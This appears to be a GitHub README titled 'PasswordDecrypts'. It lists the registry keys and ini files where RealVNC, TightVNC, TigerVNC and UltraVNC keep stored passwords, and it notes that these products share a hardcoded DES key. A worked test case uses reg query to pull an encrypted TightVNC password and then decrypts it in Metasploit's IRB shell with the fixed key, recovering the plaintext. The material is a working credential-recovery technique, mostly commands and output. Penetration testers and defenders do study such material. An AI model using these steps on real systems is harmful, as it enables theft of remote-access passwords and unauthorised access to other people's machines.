GitHub - frizb/PasswordDecrypts: Handy Stored Password Decryption Techniques

##  README.md

# [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='39'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='590' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/frizb/PasswordDecrypts#passworddecrypts)PasswordDecrypts

Handy Stored Password Decryption Techniques

## [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='40'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='593' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/frizb/PasswordDecrypts#vnc)VNC

VNC uses a hardcoded DES key to store credentials. The same key is used across multiple product lines.

*RealVNC*
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
Value: Password
*TightVNC*
HKEY_CURRENT_USER\Software\TightVNC\Server
HKLM\SOFTWARE\TightVNC\Server\ControlPassword
tightvnc.ini
vnc_viewer.ini
Value: Password or PasswordViewOnly
*TigerVNC*
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
Value: Password
*UltraVNC*
C:\Program Files\UltraVNC\ultravnc.ini
Value: passwd or passwd2

### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='41'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='615' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/frizb/PasswordDecrypts#test-case)Test Case

I downloaded TightVNC version 2.8.11 and found my password was stored here: HKLM\SOFTWARE\TightVNC\Server\ControlPassword so I used reg query to extract the encrypted password:

	Microsoft Windows [Version 10.0.17134.590]
	(c) 2018 Microsoft Corporation. All rights reserved.

	C:\Windows\system32>reg query HKLM\SOFTWARE\TightVNC\Server /s

	HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server
	--- SNIP ---
	    Password    REG_BINARY    D7A514D8C556AADE
	    ControlPassword    REG_BINARY    1B8167BC0099C7DC
	--- SNIP ---

With the encypted VNC password: D7A514D8C556AADE

I was able decrypt it easily using the Metasploit Framework and the IRB (ruby shell) with these 3 commands:

fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'

Rex::Proto::RFB::Cipher.decrypt ["YOUR ENCRYPTED VNC PASSWORD HERE"].pack('H*'), fixedkey

$> msfconsole
msf5 > irb
[*] Starting IRB shell...

[*] You are in the "framework" object>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07" =>  "\u0017Rk\u0006#NX\a">> require 'rex/proto/rfb' =>  true>> Rex::Proto::RFB::Cipher.decrypt ["D7A514D8C556AADE"].pack('H*'), fixedkey

=>  "Secure!\x00">>